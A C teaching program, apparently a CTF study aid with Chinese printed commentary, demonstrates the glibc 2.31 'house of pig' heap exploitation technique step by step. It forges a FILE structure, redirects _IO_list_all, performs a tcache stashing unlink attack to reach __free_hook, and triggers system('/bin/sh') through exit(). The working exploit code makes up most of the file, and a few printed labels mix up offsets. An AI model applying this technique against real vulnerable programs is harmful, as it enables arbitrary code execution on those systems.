
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define BLACK "30"
#define RED "31"
#define GREEN "32"
#define YELLOW "33"
#define BLUE "34"
#define PURPLE "35"
#define GREEN\_DARK "36"
#define WHITE "37"
#define UNDEFINED "-1"
#define HIGHLIGHT "1"
#define UNDERLINE "4"
#define SPARK "5"
#define STR\_END "\033[0m"
void printf\_color(char\* color, char\* effect, char\* string){
char buffer[0x1000] = {0};
strcpy(buffer, "\033[");
if(effect[0] != '-'){
strcat(buffer, effect);
strcat(buffer, ";");
}
strcat(buffer, color);
strcat(buffer, "m");
strcat(buffer, string);
printf("%s" STR\_END, buffer);
}
int main(){
printf\_color(GREEN, UNDEFINED, "今天我们来学习一下house of pig的利用原理。\n");
printf\_color(GREEN, UNDEFINED, "house of pig在只能使用calloc进行内存分配的CTF赛题中也有用武之地。\n");
printf\_color(GREEN, UNDEFINED, "首先我们了解一下这种利用方式的基本原理。\n");
printf\_color(GREEN, UNDEFINED, "本程序运行于ubuntu 20.04, glibc版本为2.31-0ubuntu9.9。\n");
printf\_color(GREEN, UNDEFINED, "在glibc 2.31下，house of pig需要利用\_\_free\_\_hook。\n\n");
printf\_color(RED, HIGHLIGHT, "第一步：获取libc的加载地址及堆地址。\n");
printf\_color(GREEN, UNDEFINED, "通过puts函数获取libc加载地址，在本libc中其偏移为0x84420。\n");
size\_t puts\_addr = (size\_t)puts;
size\_t libc\_base = puts\_addr - 0x84420;
printf\_color(YELLOW, HIGHLIGHT, "libc的加载地址为：");
printf("\033[" HIGHLIGHT ";" YELLOW "m%#zx\n" STR\_END, libc\_base);
printf\_color(GREEN, UNDEFINED, "然后我们通过分配一个chunk（大小为0x500）来获得一个堆地址。\n");
size\_t chunk\_1 = (size\_t) malloc(0x4F0) - 0x10;
printf\_color(YELLOW, HIGHLIGHT, "获得堆地址为这个chunk的起始地址：");
printf("\033[" HIGHLIGHT ";" YELLOW "m%#zx\n\n" STR\_END, chunk\_1);
printf\_color(RED, HIGHLIGHT, "第二步：通过large bin attack或其他方法将\_\_free\_hook附近写上一个堆地址。\n");
printf\_color(GREEN, UNDEFINED, "为了方便起见，本程序直接对\_\_free\_hook附近地址进行修改。\n");
printf\_color(GREEN, UNDEFINED, "在实际应用中，我们要维护好这个堆地址，在后面的步骤中还会用到。\n");
printf\_color(PURPLE, HIGHLIGHT, "这里在\_\_free\_hook-0x10处写入刚才获得的堆地址。\n");
printf\_color(GREEN, UNDEFINED, "本libc中\_\_free\_hook的偏移为0x1EEE48。\n");
size\_t \_\_free\_hook = libc\_base + 0x1EEE48;
printf\_color(YELLOW, HIGHLIGHT, "\_\_free\_hook的地址为：");
printf("\033[" HIGHLIGHT ";" YELLOW "m%#zx\n" STR\_END, \_\_free\_hook);
size\_t\* vuln\_1 = (size\_t\*)(\_\_free\_hook - 0x8);
// ---------- 第一处漏洞利用 ---------- //
\*vuln\_1 = chunk\_1;
// --------------------------------- //
printf\_color(BLUE, HIGHLIGHT, "第一处漏洞利用完成，已在\_\_free\_hook-0x10处写入堆地址。\n\n");
printf\_color(RED, HIGHLIGHT, "第三步：通过large bin attack或其他方法向\_IO\_list\_all写入一个堆地址。\n");
printf\_color(GREEN, UNDEFINED, "本libc中\_\_free\_hook的偏移为0x1ED5A0。\n");
size\_t\* \_IO\_list\_all = (size\_t\*)(libc\_base + 0x1ED5A0);
printf\_color(GREEN, UNDEFINED, "\_IO\_list\_all中原本保存的应该是\_IO\_2\_1\_stderr\_这个文件结构体实例。\n");
printf\_color(GREEN, UNDEFINED, "在程序调用exit函数时会对\_IO\_list\_all中的FILE结构体依次进行遍历。\n");
printf\_color(GREEN, UNDEFINED, "exit函数的调用链为：exit->\_IO\_cleanup->\_IO\_flush\_all\_lockp。\n");
printf\_color(GREEN, UNDEFINED, "下面是\_IO\_flush\_all\_lockp的函数定义：\n\n");
printf\_color(BLUE, HIGHLIGHT, "(/libio/genops.c， line 684)\n");
printf\_color(PURPLE, HIGHLIGHT,
"int\n"
"\_IO\_flush\_all\_lockp (int do\_lock)\n"
"{\n"
" int result = 0;\n"
" FILE \*fp;\n"
"\n"
"#ifdef \_IO\_MTSAFE\_IO\n"
" \_IO\_cleanup\_region\_start\_noarg (flush\_cleanup);\n"
" \_IO\_lock\_lock (list\_all\_lock);\n"
"#endif\n"
"\n"
" \033[1;31mfor (fp = (FILE \*) \_IO\_list\_all; fp != NULL; fp = fp->\_chain)\n"
" {\n"
" run\_fp = fp;\n"
" if (do\_lock)\n"
"\t\_IO\_flockfile (fp);\n"
"\n"
" if (((fp->\_mode <= 0 && fp->\_IO\_write\_ptr > fp->\_IO\_write\_base)\n"
"\t || (\_IO\_vtable\_offset (fp) == 0\n"
"\t && fp->\_mode > 0 && (fp->\_wide\_data->\_IO\_write\_ptr\n"
"\t\t\t\t > fp->\_wide\_data->\_IO\_write\_base))\n"
"\t )\n"
"\t && \_IO\_OVERFLOW (fp, EOF) == EOF)\n"
"\tresult = EOF;\n"
"\n"
" if (do\_lock)\n"
"\t\_IO\_funlockfile (fp);\n"
" run\_fp = NULL;\n"
" }\n\033[1;" PURPLE "m"
"\n"
"#ifdef \_IO\_MTSAFE\_IO\n"
" \_IO\_lock\_unlock (list\_all\_lock);\n"
" \_IO\_cleanup\_region\_end (0);\n"
"#endif\n"
"\n"
" return result;\n"
"}\n\n");
printf\_color(GREEN, UNDEFINED, "注意红色部分的代码，这便是遍历\_IO\_list\_all链中的所有FILE实例。\n");
printf\_color(GREEN, UNDEFINED, "其中一条if语句的判断条件中会调用\_IO\_OVERFLOW函数。\n");
printf\_color(GREEN, UNDEFINED, "这个函数指的是vtable中overflow那个字段对应的函数。\n");
printf\_color(GREEN, UNDEFINED, "要执行到这个函数，就必须要让前面一个判断条件满足。\n");
printf\_color(GREEN, UNDEFINED, "这也就是我们伪造FILE结构体时需要注意的地方。\n");
printf\_color(GREEN, UNDEFINED, "下面我们就来修改\_IO\_list\_all的值，用一个chunk地址填充。\n");
size\_t chunk\_2 = (size\_t) calloc(1, 0xF0) - 0x10;
// ---------- 第二处漏洞利用 ---------- //
\*\_IO\_list\_all = chunk\_2;
// --------------------------------- //
printf\_color(YELLOW, HIGHLIGHT, "这个chunk的起始地址为：");
printf("\033[" HIGHLIGHT ";" YELLOW "m%#zx\n" STR\_END, chunk\_2);
printf\_color(RED, HIGHLIGHT, "第四步：伪造FILE结构体。\n");
printf\_color(GREEN, UNDEFINED, "我们使用第二次分配到的chunk作为假FILE结构体进行构造。\n");
printf\_color(GREEN, UNDEFINED, "再次强调注意\_IO\_flush\_all\_lockp函数的限定条件。\n");
printf\_color(GREEN, UNDEFINED, "if语句的前一个判断条件是两个判断相或，我们只需要满足第一个判断即可：\n");
printf\_color(RED, HIGHLIGHT, "fp->\_mode <= 0 && fp->\_IO\_write\_ptr > fp->\_IO\_write\_base\n");
printf\_color(GREEN, UNDEFINED, "其中\_mode字段的偏移为0xC0，\_IO\_write\_ptr为0x28，\_IO\_write\_base为0x30。\n");
printf\_color(GREEN, UNDEFINED, "我们在\_mode处填0，在\_IO\_write\_ptr填1，在\_IO\_write\_base填0就可以了。\n");
size\_t\* fake\_FILE = (size\_t\*) chunk\_2;
fake\_FILE[0xC0 / 8] = 0; // \_mode
fake\_FILE[0x20 / 8] = 1;
fake\_FILE[0x28 / 8] = 0xFFFFFFFFFFFF; // \_IO\_write\_ptr
fake\_FILE[0x30 / 8] = 0; // \_IO\_write\_base
printf\_color(GREEN, UNDEFINED, "三个字段修改完成。但我们需要修改的可不止这三个字段。\n");
printf\_color(GREEN, UNDEFINED, "在这个判断条件通过后，我们将会进入overflow函数。\n");
printf\_color(GREEN, UNDEFINED, "house of pig的一个重要思想就是让其执行\_IO\_str\_overflow函数。\n");
printf\_color(GREEN, UNDEFINED, "这需要我们在vtable中写入\_IO\_str\_jumps的地址，其中保存有这个函数的地址。\n");
printf\_color(GREEN, UNDEFINED, "看一下IDA中的\_IO\_str\_jumps结构体：\n\n");
printf\_color(PURPLE, HIGHLIGHT,
"\_\_libc\_IO\_vtables:00000000001E9560 qword\_1E9560 dq 0 ; DATA XREF: sub\_52C20+49A↑o\n"
"\_\_libc\_IO\_vtables:00000000001E9560 ; sscanf+B5↑o ...\n"
"\_\_libc\_IO\_vtables:00000000001E9568 dq 0\n"
"\_\_libc\_IO\_vtables:00000000001E9570 dq offset sub\_93D50\n"
"\033[1;31m\_\_libc\_IO\_vtables:00000000001E9578 dq offset \_IO\_str\_overflow\n\033[1;" PURPLE "m"
"\_\_libc\_IO\_vtables:00000000001E9580 dq offset \_IO\_str\_underflow\n"
"\_\_libc\_IO\_vtables:00000000001E9588 dq offset \_IO\_default\_uflow\n"
"\_\_libc\_IO\_vtables:00000000001E9590 dq offset \_IO\_str\_pbackfail\n"
"\_\_libc\_IO\_vtables:00000000001E9598 dq offset \_IO\_default\_xsputn\n"
"\_\_libc\_IO\_vtables:00000000001E95A0 dq offset \_IO\_default\_xsgetn\n"
"\_\_libc\_IO\_vtables:00000000001E95A8 dq offset \_IO\_str\_seekoff\n"
"\_\_libc\_IO\_vtables:00000000001E95B0 dq offset sub\_92600\n"
"\_\_libc\_IO\_vtables:00000000001E95B8 dq offset sub\_924E0\n"
"\_\_libc\_IO\_vtables:00000000001E95C0 dq offset sub\_92870\n"
"\_\_libc\_IO\_vtables:00000000001E95C8 dq offset \_IO\_default\_doallocate\n"
"\_\_libc\_IO\_vtables:00000000001E95D0 dq offset sub\_937F0\n"
"\_\_libc\_IO\_vtables:00000000001E95D8 dq offset sub\_93800\n"
"\_\_libc\_IO\_vtables:00000000001E95E0 dq offset sub\_937D0\n"
"\_\_libc\_IO\_vtables:00000000001E95E8 dq offset sub\_92870\n"
"\_\_libc\_IO\_vtables:00000000001E95F0 dq offset sub\_937E0\n"
"\_\_libc\_IO\_vtables:00000000001E95F8 dq offset sub\_93810\n"
"\_\_libc\_IO\_vtables:00000000001E9600 dq offset sub\_93820\n\n");
printf\_color(GREEN, UNDEFINED, "其偏移为0x1E9560。将其填充到vtable字段，偏移为0xD8。\n");
size\_t \_IO\_str\_jumps = libc\_base + 0x1E9560;
fake\_FILE[0xD8 / 8] = \_IO\_str\_jumps;
printf\_color(GREEN, UNDEFINED, "然后，我们进入\_IO\_str\_overflow函数看看。\n\n");
printf\_color(BLUE, HIGHLIGHT, "(/libio/strops.c, line 80)\n");
printf\_color(PURPLE, HIGHLIGHT,
"int\n"
"\_IO\_str\_overflow (FILE \*fp, int c)\n"
"{\n"
" int flush\_only = c == EOF;\n"
" size\_t pos;\n"
" if (fp->\_flags & \_IO\_NO\_WRITES)\n"
" return flush\_only ? 0 : EOF;\n"
" if ((fp->\_flags & \_IO\_TIED\_PUT\_GET) && !(fp->\_flags & \_IO\_CURRENTLY\_PUTTING))\n"
" {\n"
" fp->\_flags |= \_IO\_CURRENTLY\_PUTTING;\n"
" fp->\_IO\_write\_ptr = fp->\_IO\_read\_ptr;\n"
" fp->\_IO\_read\_ptr = fp->\_IO\_read\_end;\n"
" }\n"
" pos = fp->\_IO\_write\_ptr - fp->\_IO\_write\_base;\n"
" if (pos >= (size\_t) (\_IO\_blen (fp) + flush\_only))\n"
" {\n"
" if (fp->\_flags & \_IO\_USER\_BUF) /\* not allowed to enlarge \*/\n"
"\treturn EOF;\n"
" else\n"
"\t{\n"
"\033[1;31m\t char \*new\_buf;\n"
"\t char \*old\_buf = fp->\_IO\_buf\_base;\n"
"\t size\_t old\_blen = \_IO\_blen (fp);\n"
"\t size\_t new\_size = 2 \* old\_blen + 100;\n"
"\t if (new\_size < old\_blen)\n"
"\t return EOF;\n"
"\t new\_buf = malloc (new\_size);\n"
"\t if (new\_buf == NULL)\n"
"\t {\n"
"\t /\*\t \_\_ferror(fp) = 1; \*/\n"
"\t return EOF;\n"
"\t }\n"
"\t if (old\_buf)\n"
"\t {\n"
"\t memcpy (new\_buf, old\_buf, old\_blen);\n"
"\t free (old\_buf);\n"
"\t /\* Make sure \_IO\_setb won't try to delete \_IO\_buf\_base. \*/\n"
"\t fp->\_IO\_buf\_base = NULL;\n"
"\t }\n\033[1;" PURPLE "m"
"\t memset (new\_buf + old\_blen, '\\0', new\_size - old\_blen);\n"
"\n"
"\t \_IO\_setb (fp, new\_buf, new\_buf + new\_size, 1);\n"
"\t fp->\_IO\_read\_base = new\_buf + (fp->\_IO\_read\_base - old\_buf);\n"
"\t fp->\_IO\_read\_ptr = new\_buf + (fp->\_IO\_read\_ptr - old\_buf);\n"
"\t fp->\_IO\_read\_end = new\_buf + (fp->\_IO\_read\_end - old\_buf);\n"
"\t fp->\_IO\_write\_ptr = new\_buf + (fp->\_IO\_write\_ptr - old\_buf);\n"
"\n"
"\t fp->\_IO\_write\_base = new\_buf;\n"
"\t fp->\_IO\_write\_end = fp->\_IO\_buf\_end;\n"
"\t}\n"
" }\n"
"\n"
" if (!flush\_only)\n"
" \*fp->\_IO\_write\_ptr++ = (unsigned char) c;\n"
" if (fp->\_IO\_write\_ptr > fp->\_IO\_read\_end)\n"
" fp->\_IO\_read\_end = fp->\_IO\_write\_ptr;\n"
" if (flush\_only)\n"
" return 0;\n"
" else\n"
" return c;\n"
"}\n\n");
printf\_color(GREEN, UNDEFINED, "注意红色部分的代码，这里会连续调用malloc、memcpy、free函数。\n");
printf\_color(GREEN, UNDEFINED, "house of pig想要在这里大做文章。\n");
printf\_color(GREEN, UNDEFINED, "首先需要通过tcache stashing unlink attack或其他方法向tcache中插入\_\_free\_hook附近的地址。\n");
printf\_color(GREEN, UNDEFINED, "然后在运行到此时，首先通过malloc分配出来，然后memcpy将指定位置的内容复制到\_\_free\_hook。\n");
printf\_color(GREEN, UNDEFINED, "最后通过free函数执行\_\_free\_hook中的内容，这里将\_\_free\_hook修改为system函数地址。\n");
printf\_color(GREEN, UNDEFINED, "通过代码我们可以知道，memcpy是将\_IO\_buf\_base（结构体内偏移0x38）地址处的内容复制到\_\_free\_hook。\n");
printf\_color(GREEN, UNDEFINED, "而这个复制的原地址是我们可控的，需要我们在伪造的FILE结构体中设置。\n");
printf\_color(GREEN, UNDEFINED, "这里我们设置这个地址的值为第一个chunk的地址+0x20。\n");
printf\_color(GREEN, UNDEFINED, "............\n");
fake\_FILE[0x38 / 8] = chunk\_1 + 0x20;
printf\_color(GREEN, UNDEFINED, "设置完成。之后我们需要注意malloc函数申请的chunk大小，其申请的大小需要经过计算。\n");
printf\_color(GREEN, UNDEFINED, "计算方式是：(\_IO\_buf\_end - \_IO\_buf\_base) \* 2 + 100。\n");
printf\_color(GREEN, UNDEFINED, "这要求我们正确设置\_IO\_buf\_end的值。如果使用0x100的tcache进行攻击，则end-base=0x46。\n");
printf\_color(GREEN, UNDEFINED, "据此设置\_IO\_buf\_end为第一个chunk的地址+0x20+0x46（结构体内偏移0x40）。\n");
printf\_color(GREEN, UNDEFINED, "............\n");
fake\_FILE[0x40 / 8] = chunk\_1 + 0x20 + 0x46;
printf\_color(GREEN, UNDEFINED, "设置完成。最后注意free函数的参数是FILE结构体的起始地址，因此在第二个chunk+0x20处写入\"/bin/sh\\x00\"。\n");
printf\_color(GREEN, UNDEFINED, "另外在第二个chunk+0x30处写入system函数地址，memcpy函数能够将这里的地址复制到\_\_free\_hook。\n");
strcpy((char\*)(chunk\_1 + 0x20), "/bin/sh");
\*(size\_t\*)(chunk\_1 + 0x20 + 0x10) = (size\_t)system;
printf\_color(GREEN, UNDEFINED, "............\n");
printf\_color(GREEN, UNDEFINED, "设置完成。\n\n");
printf\_color(RED, HIGHLIGHT, "第五步：通过tcache stashing unlink attack在tcache写入\_\_free\_hook附近地址。\n");
printf\_color(GREEN, UNDEFINED, "当赛题中只使用calloc时，只有在tcache中存放堆地址，才能让malloc分配到\_\_free\_hook。\n");
printf\_color(GREEN, UNDEFINED, "下面进行这种攻击的常规流程：\n");
printf\_color(GREEN, UNDEFINED, "首先分配9个chunk并释放，7个到tcache，2个到small bins。然后分配两个tcache chunk出来。\n");
void\* chunks[9];
for(int i=0; i<7; i++)
chunks[i] = malloc(0xF0);
malloc(0x20); // to avoid consolidate
chunks[7] = malloc(0xF0);
malloc(0x20); // to avoid consolidate
chunks[8] = malloc(0xF0);
malloc(0x20); // to avoid consolidate
for(int i=0; i<9; i++)
free(chunks[i]);
malloc(0xF0);
malloc(0xF0);
malloc(0x100);
printf\_color(GREEN, UNDEFINED, "依次释放9个chunk，tcache中的chunk应该为：7->6->5->4->3->2->1。\n");
printf\_color(GREEN, UNDEFINED, "unsorted bin中的chunk应该为：9<->8。\n");
printf\_color(GREEN, UNDEFINED, "然后分配出来两个tcache chunk，再分配一个较大的chunk，让unsorted bin的两个chunk进入small bins。\n");
printf\_color(GREEN, UNDEFINED, "应该修改第9个chunk的bk指针为\_\_free\_hook附近地址。\n");
printf\_color(GREEN, UNDEFINED, "............\n");
\*(size\_t\*)((size\_t)(chunks[8]) + 0x8) = \_\_free\_hook - 0x20;
printf\_color(GREEN, UNDEFINED, "修改完成，之后分配一个出来进行攻击。\n");
calloc(1, 0xF0);
printf\_color(GREEN, UNDEFINED, "已经分配出来了一个chunk，现在0x100的tcache中的第一个chunk就是\_\_free\_hook附近的地址。\n\n");
printf\_color(RED, HIGHLIGHT, "第六步：调用exit函数触发house of pig漏洞。\n");
printf\_color(GREEN, UNDEFINED, "现在，所有的东西都已经布置好了，只需要一个exit函数，我们就能够执行预期的函数调用链并getshell。\n");
exit(-1);
}
```
